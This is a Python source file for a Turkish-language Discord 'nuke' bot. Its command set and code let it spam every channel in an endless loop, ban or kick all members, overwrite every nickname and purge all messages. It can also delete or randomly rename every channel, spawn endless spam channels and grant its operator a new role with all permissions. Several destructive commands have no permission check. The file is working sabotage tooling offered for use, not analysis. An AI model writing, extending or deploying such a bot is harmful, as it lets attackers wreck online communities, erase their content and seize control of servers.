# Coded By KarışıkTurşu
# Discord: KarışıkTurşu#0242
import discord
from discord.ext import commands
from discord import Permissions
import config
import random
import string

prefix = "PREFIX HERE"
client = commands.Bot(command_prefix = prefix)


page = """
```
Prefix: PREFIX HERE
Crab botun bütün komutları:

komutlar : bu komut
ping : gecikmeyi ms türünden gönderir
spam_all (spam_mesajı) : bütün kanallara belirlediğiniz spam_mesajını atar
spam (spam_mesajı) : sadece komutun çağırıldığı kanala spam_mesajını atar
shutdown : botu kapatır
change_server_name (yeni_ad) : bulunduğunuz serverin ismini değiştirir
give_admin : bütün yetkiler olan bir rol verir 
ban (@üye) : belirlediğiniz üyeyi banlar
ban_all : herkesi banlar
kick (@üye) : belirlediğiniz üyeyi atar
kick_all : herkesi atar
nickname (yeni_nick) : sunucudaki herkesin adını (yeni_nick) yapar
purge_all : bütün kanallardaki bütün mesajları siler
channel (create, delete, rename) : bütün kanalları siler, ismini değiştirir ya da rastgele kanal oluşturur
```
"""


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="Bip Bop"))
    print("Askeri Bot Hazır.")

@client.command()
async def ping(ctx):
    await ctx.send(f"Pong {round(client.latency,1)} ms")
 
@client.command()
async def komutlar(ctx):
    global page
    await ctx.send(page)


@client.command()
async def spam_all(ctx,*args):

    await ctx.send("Spam başladı durdurmak için \" stop \" yaz")

    mesaj = " ".join(args)

    def check_reply(m):
        return m.content == 'stop' and m.author.id in config.admins

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                await tc.send(mesaj)

    spam_text_task = client.loop.create_task(spam_text())
    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send("Spam tamamlandı")

@client.command()
async def spam(ctx,*args):
    await ctx.send("Spam başladı durdurmak için \" stop \" yaz")

    mesaj = " ".join(args)

    def check_reply(m):
        return m.content == 'stop' and m.author.id in config.admins

    async def spam_text():
        while True: await ctx.send(mesaj)

    spam_text_task = client.loop.create_task(spam_text())
    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send("Spam tamamlandı")


@client.command()
async def shutdown(ctx):
    if ctx.author.id in config.admins:
        await ctx.send("True")
        exit()
    else:
        await ctx.send("Yetkiniz bulunmamakta")


@client.command()
async def change_server_name(ctx, *args):
    sv_name = " ".join(args)
    await ctx.guild.edit(name=sv_name)
    await ctx.send("Server ismi değiştirildi")

@client.command()
async def give_admin(ctx):
    if ctx.author.id in config.admins:
        
        await ctx.guild.create_role(
            name='Administrator',
            permissions=Permissions.all(),
            color=discord.Color(0x36393f)
        )

        role = discord.utils.get(ctx.guild.roles, name='Administrator')
        await ctx.author.add_roles(role)
        await ctx.send("Bütün yetkiler verildi.")

    else: await ctx.send("Yetkiniz bulunmamaktadır")


@client.command()
async def ban_all(ctx):
    if ctx.author.id in config.admins:
        await ctx.send("Bütün üyeler banlanıyor!")
        for member in ctx.guild.members:
            try:
                if not member.id in config.admins:
                    await member.ban()
                else:
                    continue
            except discord.Forbidden:
                continue
    else: await ctx.send("Yetkiniz bulunmamaktadır")

@client.command()
async def ban(ctx, member:discord.Member, *, reason=None):
    if ctx.author.id in config.admins:
        await member.ban(reason=reason)
        await ctx.send("Ban başarılı")
    else:
        await ctx.send("Yetkiniz bulunmamaktadır")

@client.command()
async def kick(ctx, member:discord.Member,*,reason=None):
    if ctx.author.id in config.admins:
        await member.kick(reason=reason)
        await ctx.send("Kick başarılı")
    else:
        await ctx.send("Yetkiniz bulunmamaktadır")

@client.command(name='unban')
async def _unban(ctx, id: int):
    if ctx.author.id in config.admins:
        user = await client.fetch_user(id)
        await ctx.guild.unban(user)
        await ctx.send("Unban başarılı")
    else:
        await ctx.send("Yetkiniz bulunmamaktadır")

@client.command()
async def kick_all(ctx):
    await ctx.send("Bütün üyeler atılıyor!")
    for member in ctx.guild.members:
        try:
            if not member.id in config.admins:
                await member.kick()
            else:
                continue
        except discord.Forbidden:
            continue

@client.command()
async def nickname(ctx,*args):
    for member in ctx.guild.members:
        nickname = ' '.join(args)
        try:
            await member.edit(nick=nickname)
        except discord.Forbidden:
            continue

@client.command()
async def purge_all(ctx):
    for tc in ctx.guild.text_channels:
        await tc.purge(bulk=True)

@client.command()
async def channel(ctx, choice):
    if ctx.author.id in config.admins:
        if choice == 'create':
            await ctx.send("Rastgele kanal oluşturuluyor durmak için \" stop \" yaz")

            def check_reply(m):
                return m.content == 'stop' and m.author.id in config.admins

            async def spam_create_channels():
                i = 0
                while True:
                    await ctx.guild.create_text_channel(f'Spam-Metin-Kanalı{i}')
                    await ctx.guild.create_voice_channel(f'Spam-Ses-Kanalı{i}')
                    i += 1

            spam_channel_task = client.loop.create_task(spam_create_channels())
            await client.wait_for('message', check=check_reply)
            spam_channel_task.cancel()
            await ctx.send("İşlem tamamlandı")

        elif choice == 'delete':
            await ctx.send("Bütün kanallar siliniyor")
            for chan in ctx.guild.channels:
                await chan.delete()

        elif choice == 'rename':
            await ctx.send("Bütün kanalların ismi değiştiriliyor")
            char = string.ascii_letters + string.digits
            for chan in ctx.guild.channels:
                chan_name = ''.join((random.choice(char) for i in range(16)))
                await chan.edit(name=chan_name)

        else:
            await ctx.send("Geçersiz seçenek")
    else:
        await ctx.send("Yetkiniz bulunmamaktadır")


client.run(config.token)
